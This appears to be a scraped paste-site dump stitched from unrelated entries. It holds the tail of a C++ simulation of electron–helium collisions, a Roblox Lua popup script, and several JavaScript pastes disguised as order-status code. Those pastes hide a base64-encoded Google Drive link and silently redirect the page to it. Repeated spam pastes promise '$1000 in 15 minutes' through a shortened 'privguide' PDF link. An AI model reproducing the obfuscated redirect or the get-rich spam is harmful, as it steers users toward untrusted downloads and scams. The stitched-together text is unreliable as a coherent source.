            elastic_vec[i] * n_ground +
            inelastic1_vec[i] * n_ground +
            inelastic2_vec[i] * n_ground +
            superelastic1_vec[i] * n_excited1 +
            superelastic2_vec[i] * n_excited2;
 
        double v = sqrt(2 * energy * q / m_e);
        double nu_temp = sigma_total * v;
        
        if (nu_temp > nu_max) nu_max = nu_temp;
    }
 
    std::cout << ""initial nu_max: "" <<nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////    

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995


    while (t_elapsed < total_time) {
        // Handle edge case for final step
        if (t_elapsed + dt > total_time) {
            dt = total_time - t_elapsed;
        }    
 
 
        //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
        int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;   

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index


        for (int i = 0; i < Ne_collided; ++i) {
            int j = i + std::uniform_int_distribution<int>(0, n_e - i - 1)(gen);
            std::swap(electron_indices[i], electron_indices[j]);
        }

        int exc1_coll_counter_temp = 0;
        int super1_coll_counter_temp = 0;
        int exc2_coll_counter_temp = 0;
        int super2_coll_counter_temp = 0;
        int null_coll_counter_temp = 0;

        double energy_exc = 0.0; // calculating excitation losses each timestep
        double energy_sup = 0.0; // calculating superelastic gains each timestep
        double energy_Efield = 0.0; // calculating field gains/losses each timestep


        // std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""\n"";

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided_en = false;
        for (auto& e : electrons) e.collided_ee = false;        

        int collision_counter_en = 0; // electron-neutral collision counter
        int collision_counter_ee = 0; // e-e collisoin counter

        /// -- electrin field heating along E-Z axis begin--- /// -- first half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; // dividing by q to get eV             
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz)*charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------//   


        for (int idx : electron_indices) {

            if (collision_counter_en >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided_en) continue;  // Skip already collided electrons

            double dens_neutrals = (N_He/Volume);
            double dens_exc_1 = (exc_1.size()/Volume);
            double dens_exc_2 = (exc_2.size()/Volume);
            double speed = sqrt_charge_mass*sqrt(e.energy);

            int bin_energy = static_cast<int>(e.energy / bin_width);
            double nu_elastic = dens_neutrals * elastic_vec[bin_energy] * speed;
            double nu_inelastic1 = dens_neutrals * inelastic1_vec[bin_energy] * speed;
            double nu_superelastic1 = dens_exc_1 * superelastic1_vec[bin_energy] * speed;
            double nu_inelastic2 = dens_neutrals * inelastic2_vec[bin_energy] * speed;
            double nu_superelastic2 = dens_exc_2 * superelastic2_vec[bin_energy] * speed;

            double r = dis(gen);

            double P0 = nu_elastic/nu_max;
            double P1 = (nu_elastic + nu_inelastic1)/nu_max;
            double P2 = (nu_elastic + nu_inelastic1 + nu_superelastic1)/nu_max;
            double P3 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2)/nu_max;
            double P4 = (nu_elastic + nu_inelastic1 + nu_superelastic1 + nu_inelastic2 + nu_superelastic2)/nu_max;            

            if (r < P0) {
 
                // elastic collision happens
 
                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;
 
                // neutral particle X Y Z initial velocities
 
                // randomize particles each collision
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;
 
                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 
 
                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);
 
                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);
 
                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)
 
                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    
 
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                // double cos_theta = (2.0 + e.energy - 2.0*pow((1.0+e.energy),R1))/e.energy;
                // double sin_theta = sqrt(abs(1.0-cos_theta*cos_theta));
                double phi = 2*M_PI*R2;
 
                //calculating final relative velocity with random direction
 
                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);
 
                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);
 
                //calculating final velocity of electron
 
                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));
 
                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);
 
                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;
 
                collision_counter_en++;
                el_coll_counter++;
 
                e.collided_en = true;
            }      

            else if (r < P1) {

                //inelastic 1(triplet) collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh1) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh1;

                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc1_coll_counter++;
                    exc1_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_1
                    if (N_He > 0) {
                        exc_1.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }     

            else if (r < P2) {

                //superelastic 1(triplet -> ground state) collision happens

                if (exc_1.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_1.size()-1)(gen);
                Excited_neutral& exc = exc_1[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh1;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector
                if (!exc_1.empty()) {
                    std::swap(exc_1[index], exc_1.back());
                    exc_1.pop_back();
                    N_He++;
                }
                collision_counter_en++;   
                super1_coll_counter++;
                super1_coll_counter_temp++;
                energy_sup += thresh1;

                e.collided_en = true;
            }  

            else if (r < P3) {

                //inelastic 1(singlet) excitation collision happens

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;
                
                // neutral that collides with electron

                // randomize particles each collision

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V_x_n = tmp_neutral.vx;
                double V_y_n = tmp_neutral.vy;
                double V_z_n = tmp_neutral.vz;
                double E_n = tmp_neutral.energy;

 
                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt_charge_mass*sqrt(e.energy);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt_charge_mass*sqrt(e.energy);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;
                energy_sup += thresh2;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }


        /// -- electrin field heating along E-Z axis begin--- /// -- second half!!!
        for (int idx : electron_indices) {
            double half_dt = dt/2.0;
            energy_Efield += ( C1*electrons[idx].vz*half_dt + C2*half_dt*half_dt )/q; //dividing by q to get eV
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[idx].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            double vx = electrons[idx].vx;
            double vy = electrons[idx].vy;
            double vz = electrons[idx].vz;
            electrons[idx].energy = (vx*vx + vy*vy + vz*vz) * charge_mass_ratio;
        }
        // -------------------------------------------- filed heating ends ------------------------////////////////

        int decay_counter = 0;

        // // Iterate backwards to safely remove elements
        // for (int i = exc_2.size() - 1; i >= 0; --i) {
        //     if (dis(gen) < dt / tau_singlet) {
        //         // Swap with last element and pop (like your superelastic code)
        //         std::swap(exc_2[i], exc_2.back());
        //         exc_2.pop_back();
        //         N_He++;
        //         decay_counter++;
        //     }
        // }


        t_elapsed += dt; // Advance time
 
        // Recalculate nu_max periodically (e.g., every 100 steps)
        static int recalc_counter = 0;
        if (++recalc_counter >= 1000) {
            
            recalc_counter = 0;
 
            // Recalculate nu_max with CURRENT densities
            nu_max = 0.0;
            for (int i = 0; i < N; i++) {
                double energy = Emin + (i + 0.5) * bin_width;
                
                // Get current densities
                double n_ground = N_He / Volume;
                double n_excited1 = exc_1.size() / Volume;
                double n_excited2 = exc_2.size() / Volume;
                
                // Total collision frequency for this energy bin
                double sigma_total = 
                    elastic_vec[i] * n_ground +
                    inelastic1_vec[i] * n_ground +
                    inelastic2_vec[i] * n_ground +
                    superelastic1_vec[i] * n_excited1 +
                    superelastic2_vec[i] * n_excited2;
 
                double speed = sqrt_charge_mass*sqrt(energy);
                double nu_temp = sigma_total * speed;
                
                if (nu_temp > nu_max) nu_max = nu_temp;
            }

            // Update dt based on new nu_max
            dt = 0.1 / nu_max;        
        }   

        // calculating mean energy 
        if (static_cast<int>(t_elapsed/dt)%print_interval == 0) {
            double total_energy = 0.0;
            for (const auto& e : electrons) total_energy += e.energy;
            double mean_energy = total_energy / n_e;
            file8 << t_elapsed << "" "" << mean_energy << ""\n"";            
            file_temp << t_elapsed << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";
            std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""%"" << "" "";
            std::cout << ""   nu_max: "" << nu_max << ""    "" << ""dt: "" << dt << "" "" << ""decay counter: "" << decay_counter <<   ""\n"";
            file16 << t_elapsed << "" "" << energy_Efield/n_e << "" "" << energy_sup/n_e << ""\n"";
        }        

    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";
        std::cout << ""Final nu max: "" << nu_max << ""\n"";

    // ----- final electron energies distribution ends


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();
    file16.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    // std::cout << ""# of steps: "" << steps << ""\n"";
    // std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    // std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    // std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""triplet:________"" << ""\n"";
    // std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""singlet:________"" << ""\n"";
    // std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";    

    // std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
m6xfKgL0,Order.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 07:05:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45058/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rkK2R6S1,Make $1000 15-MINUTES (BEGINNER) 2J,nooooooooootbr,JavaScript,Saturday 19th of April 2025 07:04:43 PM CDT," 
Pdf https://tinyurl.com/privguidee


Vp9lvJCu8r
"
XhLZPFbc,EARN $900 INSTANTLY 2025⭐ 8F,nooooooooootbr,JavaScript,Saturday 19th of April 2025 06:51:11 PM CDT," 
Pdf https://tinyurl.com/privguidee


7VZbc6j9vg
"
DVS0ZuNY,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:49:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64848/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ivZwYumw,Make $1000 15-MINUTES  (BEGINNER) HA,nooooooooootbr,JavaScript,Saturday 19th of April 2025 06:37:42 PM CDT," 
Pdf https://tinyurl.com/privguidee


DWkMW0PdhH
"
6YxeX9jN,Untitled,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:34:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98886/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pk2fcjtW,Popup Part w/ ProximityPrompt,bookedsam,Lua,Saturday 19th of April 2025 06:31:21 PM CDT,"-- openStudio Popup Parts
-- Local Popup Handler
-- Build 3.5 ProximityPrompt 20/4/25

-- // CONFIG

-- ℹ️ℹ️ Watch the tutorial by @bookedsam for help configuring the system. ℹ️ℹ️

local config = { -- Change these settings how you like. Settings are case sensitive.
	
	-- The name of the theme. Included themes:
	-- ""Classic light"" ""Classic dark"" ""Bubbly"" ""Code"" ""Modern"" ""Transparent""
	[""Theme""] = ""Classic light"",
	
	-- The type of animation. Included animations:
	-- ""Fade"" ""Typewriter"" ""Bounce""
	[""Animation""] = ""Fade"",
	
	-- Set to false if you want it to only work once.
	[""Repeat""] = false
	
}

-- ⚠️⚠️ ONLY EDIT BEYOND THIS POINT IF YOU KNOW WHAT YOU ARE DOING ⚠️⚠️

-- // VARIABLES

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local TweenService = game:GetService(""TweenService"")
local Players = game:GetService(""Players"")

local themes = ReplicatedStorage:WaitForChild(""openPopup"")
local partFolder = workspace:WaitForChild(""openPopup"")

local label = nil
local labelSave = nil
local animations = {}

-- // FUNCTIONS

-- Animation that fades in and out the text.
animations.Fade = function(text: string)
	
	local info = TweenInfo.new(1)
	
	local fadeIn = TweenService:Create(label, info, 
		{BackgroundTransparency = labelSave.BackgroundTransparency, 
		TextTransparency = labelSave.TextTransparency})
	local fadeOut = TweenService:Create(label, info, 
		{BackgroundTransparency = 1,
		TextTransparency = 1})
	
	label.Transparency = 1
	fadeIn:Play()
	fadeIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	fadeOut:Play()
	fadeOut.Completed:Wait()
	
end

-- Animation that has a typing effect.
animations.Typewriter = function(text: string)
	
	local infoType = TweenInfo.new(string.len(text) / 10, Enum.EasingStyle.Linear)
	local infoFade = TweenInfo.new(0.5)
	
	local typeIn = TweenService:Create(label, infoType, {MaxVisibleGraphemes = string.len(text)})
	
	local fadeIn = TweenService:Create(label, infoFade, {BackgroundTransparency = labelSave.BackgroundTransparency})
	local fadeOut = TweenService:Create(label, infoFade, {BackgroundTransparency = 1})
	
	label.MaxVisibleGraphemes = 0
	label.BackgroundTransparency = 1
	fadeIn:Play()
	typeIn:Play()
	typeIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	fadeOut:Play()
	fadeOut.Completed:Wait()
	
end

-- Animation where the text object jumps into frame.
animations.Bounce = function(text: string)
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
	
	local bounceIn = TweenService:Create(label, info, {Size = labelSave.Size})
	local bounceOut = TweenService:Create(label, info, {Size = UDim2.new(0, 0, 0 ,0)})
	
	label.Size = UDim2.new(0, 0, 0, 0)
	bounceIn:Play()
	bounceIn.Completed:Wait()
	task.wait(string.len(text) / 20)
	bounceOut:Play()
	bounceOut.Completed:Wait()
	
end

local function setupPart(part)
	if part:IsA(""Part"") then

		for _, e in ipairs(part:GetChildren()) do

			if e:IsA(""Decal"") then e:Destroy() end

		end

		local partText = part:WaitForChild(""Text"").Value
		local debounce = false
		
		local connection
		connection = part:WaitForChild(""ProximityPrompt"").Triggered:Connect(function()

			if debounce then return end
			debounce = true
			part:WaitForChild(""ProximityPrompt"").Enabled = false

			label.Text = partText
			label.Visible = true
			animations[config.Animation](partText)
			label.Visible = false

			task.wait(1)
			if config.Repeat then 
				debounce = false
				part:WaitForChild(""ProximityPrompt"").Enabled = true
			else connection:Disconnect() end
		end)
	end
end

-- // SETUP

if not animations[config.Animation] then
	
	warn(""[openPopup] The animation you set could not be found! Defaulting to 'Fade'."")
	config.Animation = ""Fade""
	
end

if not themes:WaitForChild(config.Theme, 1) then
	
	warn(""[openPopup] The theme you set could not be found! Defaulting to 'Classic light'"")
	config.Theme = ""Classic light""
	
end

label = themes:WaitForChild(config.Theme):Clone()
label.Visible = false
label.Parent = script.Parent
labelSave = themes:WaitForChild(config.Theme)

print(""[openPopup] openStudio Popup System ready. Have any errors? Contact @bookedsam."")

-- // MAIN

task.wait(1)

for _, v in ipairs(partFolder:GetChildren()) do
	setupPart(v)
end

partFolder.ChildAdded:Connect(function(part)
	setupPart(part)
end)"
K9crxHxD,EARN $900 INSTANTLY 2025 XH,nooooooooootbr,JavaScript,Saturday 19th of April 2025 06:24:16 PM CDT," 
Pdf https://tinyurl.com/privguidee


FhKBijHSfm
"
0NH8P6PB,Products.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:18:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97637/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
